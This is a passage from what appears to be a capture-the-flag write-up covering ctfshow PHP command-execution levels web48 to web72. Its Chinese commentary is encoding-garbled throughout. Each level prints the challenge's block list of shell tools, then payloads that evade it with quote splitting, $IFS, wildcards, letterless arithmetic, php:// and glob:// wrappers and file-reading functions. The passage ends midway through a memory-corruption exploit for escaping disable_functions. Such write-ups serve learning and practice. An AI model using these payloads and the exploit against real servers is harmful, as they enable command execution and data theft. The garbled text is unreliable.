class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><blockquote><p>tac%09flâ€™â€™ag.php||</p><p>â€¦â€¦.</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>å¤šè¿‡æ»¤äº†ä¸€äº›å‡½æ•°ï¼Œä¸è¿‡ä¹‹å‰Payloadå¯ä»¥ç»§ç»­æ‰“</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†%ï¼Œä½†æ˜¯å¯ä»¥&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>åŒä¸Š</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>banäº†tacä½†æ˜¯å¯ä»¥ç”¨nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>banäº†&lt;&gt;ï¼Œä½†æ˜¯å¯ä»¥ç”¨$IFS,è€Œä¸”è¿™æ¬¡flagæ”¾åœ¨äº†æ ¹ç›®å½•</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;flâ€™â€™ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€?c&#x3D;taâ€™â€™c${IFS}fâ€™â€™lag.php</p><p>2ã€sâ€™â€™ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2ã€mv flag.php t.txt</p></blockquote><h4 id="web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ"><a href="#web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)"></a>web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯</p><p><img src="web55.png" loading="lazy"></p><p>åˆ©ç”¨postä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨.(source)æ‰§è¡Œï¼Œä¸€èˆ¬ä¸Šä¼ åæ–‡ä»¶åœ¨&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[å‚è€ƒæ–‡ç« ]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>â€œæ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œâ€</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>æ–¹æ³•åŒä¸Š</p><h4 id="web57-å–å"><a href="#web57-å–å" class="headerlink" title="web57(å–å)"></a>web57(å–å)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//flag in 36.php </span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†å­—æ¯æ•°å­—</p><p>é€šè¿‡<code>$(())</code>æ“ä½œæ„é€ å‡º36ï¼š <code>$(())</code> ï¼šä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0</p><p><code>$(( ~$(()) )) </code>ï¼šå¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>ï¼š -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>ï¼šå†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1</p><p>æ•…æˆ‘ä»¬åœ¨<code>$(( ~$(( )) ))</code>é‡Œé¢æ”¾37ä¸ª<code>$((~$(())))</code>ï¼Œå¾—åˆ°-37ï¼Œå–åå³å¯å¾—åˆ°36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€c&#x3D;show_source(â€˜flag.phpâ€™);</p><p>2ã€c&#x3D;highlight_file(â€œflag.phpâ€);</p><p>3ã€c&#x3D;include($_POST[â€˜wâ€™]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4ã€c&#x3D;include(â€œflag.phpâ€);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>PayloadåŒä¸Š</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>PayloadåŒä¸Š</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>PayloadåŒä¸Š</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>PayloadåŒä¸Šï¼Œä¸è¿‡banäº†highlight_fileå‡½æ•°</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>PayloadåŒä¸Š</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>PayloadåŒä¸Š</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>banäº†show_source,ç„¶åä½¿ç”¨phpä¼ªåè®®è¯»å–flag.phpæ—¶ï¼Œæºç æ˜¾ç¤ºflagä¸åœ¨è¿™ï¼Œäºæ˜¯ä½¿ç”¨dataåè®®è¯»å–æ ¹ç›®å½•çœ‹åˆ°flag.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="web65.png" loading="lazy"></p><p>å› ä¸ºå¤§éƒ¨åˆ†ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è¢«banäº†ï¼Œçœ‹äº†wpæ²¡æƒ³åˆ°highlight_fileæ²¡è¢«ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>PayloadåŒä¸Š</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_fileè¢«banäº†ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ç”¨phpä¼ªåè®®è¯»å–</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>PayloadåŒä¸Š</p><p>implodeï¼šæŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²</p><p>å†·é—¨å‡½æ•°ï¼šè¯»å–å‡½æ•°readgzfileï¼šå¯ä»¥è¯»å–égzæ ¼å¼çš„æ–‡ä»¶</p><p>Payloadï¼š</p><blockquote><p>1ã€?c&#x3D;echo(implode(â€˜â€”â€˜,scandir(â€œ&#x2F;â€œ)));</p><p>2ã€?c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>è™½ç„¶æœ‰å‡ ä¸ªæŠ¥é”™ä½†æ˜¯flagè¿˜æ˜¯å‡ºæ¥äº†</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è™½ç„¶phpä¼ªåè®®å¯ä»¥è¯»ï¼Œä½†æ˜¯ç»“æœæŠŠæ•°å­—å­—æ¯æ›¿æ¢äº†ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œphpä»£ç è®©åé¢çš„åŒ¹é…ç¼“å†²åŒºä¸æ‰§è¡Œç›´æ¥é€€å‡ºexitæˆ–die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);exit(0);</p><p>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>PayloadåŒä¸Š</p><h4 id="web72-globåè®®-wafç»•è¿‡"><a href="#web72-globåè®®-wafç»•è¿‡" class="headerlink" title="web72(globåè®®+wafç»•è¿‡)"></a>web72(globåè®®+wafç»•è¿‡)</h4><p>flagä¸åœ¨&#x2F;ä¸‹äº†ï¼Œä½†æ˜¯å¾ˆå¤šæŸ¥è¯¢çš„å‡½æ•°è¢«banäº†</p><p>ä½¿ç”¨glob:&#x2F;&#x2F;ä¼ªåè®®ç»•è¿‡open_basedir</p><p>globå¯ä»¥éå†ç›®å½•ï¼Œå¹¶ä¸”ä¸å—disable_functionsçš„é™åˆ¶ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ä»”ç»†çœ‹çœ‹è¿™ä¸ªä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># åˆ©ç”¨DirectoryIterator($path)å¯ä»¥å®ç°éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span><span class="token comment"># glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><span class="token comment"># DirectoryIterator("glob:///*")   éå†æ ¹ç›®å½•é‡Œæ‰€æœ‰æ–‡ä»¶</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  <span class="token comment">#å¾ªç¯éå†è¾“å‡ºï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºåˆ†éš”</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶å®ä¸åŠ å‰é¢<code>?&gt;&lt;?php</code>ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚evalé‡Œçš„è¯­å¥å¯ä»¥è§†ä¸ºåœ¨å½“å‰phpæ–‡ä»¶é‡ŒåŠ äº†å‡ æ¡è¯­å¥ï¼Œè¿™äº›è¯­å¥å¿…é¡»æ˜¯å®Œæ•´çš„ï¼Œå³å¿…é¡»ä»¥<code>;</code>æˆ–è€…<code>?&gt;</code>ç»“å°¾æ¥ç»“æŸè¯­å¥ï¼Œä½†æ˜¯evalé‡Œçš„?&gt;ä¸ä¼šé—­åˆå½“å‰çš„phpæ–‡ä»¶ï¼Œæ‰€ä»¥å½“å‰phpé¡µé¢åç»­çš„è¯­å¥éƒ½æ˜¯ä¼šæ‰§è¡Œçš„ã€‚</p><p>å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„å›¾ç‰‡ï¼Œevalé‡Œçš„è¯­å¥å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å˜é‡å€¼ï¼Œä½†æ˜¯<code>?&gt;</code>å¹¶ä¸ä¼šé—­åˆå¤–é¢çš„PHPè¯­å¥ã€‚<br><img src="web72.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>         <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token 